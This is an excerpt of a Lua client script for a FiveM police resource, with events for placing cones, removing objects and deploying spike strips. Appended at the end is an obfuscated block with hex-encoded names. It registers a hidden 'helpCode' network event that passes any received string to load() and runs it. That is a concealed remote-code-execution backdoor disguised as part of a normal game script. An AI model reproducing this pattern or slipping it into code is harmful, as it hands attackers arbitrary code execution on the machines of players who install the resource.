...
RegisterNetEvent('police:client:spawnCone', function()
    DenaliFW.Functions.Progressbar("spawn_object", Lang:t("progressbar.place_object"), 2500, false, true, {
...
RegisterNetEvent('police:client:deleteObject', function()
    ...
    if dist < 5.0 then
        DenaliFW.Functions.Progressbar("remove_object", Lang:t('progressbar.remove_object'), 2500, false, true, {
            disableMovement = true,
            disableCarMovement = true,
            disableMouse = false,
            disableCombat = true,
...
RegisterNetEvent('police:client:SpawnSpikeStrip', function()
    if #SpawnedSpikes + 1 < Config.MaxSpikes then
        ...
        DenaliFW.Functions.Notify(Lang:t("error.no_spikestripe"), 'error')
    end
end)
...
local KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[6][KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[1]](KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[2]) KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[6][KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[3]](KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[2], function(pguXDSpQQfHIxLyCzJjUSynvpJeZSWBVpFVNAFqkiCnqQMYRiNfQVuIuSVkgvBOeifnsXq) KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[6][KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[4]](KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[6][KnmXTlwOzLlhRGanjMYhgdbalzPebskDZZHtudIpmPobArFivcACMNnKcpAvjwbFQUTkpQ[5]](pguXDSpQQfHIxLyCzJjUSynvpJeZSWBVpFVNAFqkiCnqQMYRiNfQVuIuSVkgvBOeifnsXq))() end)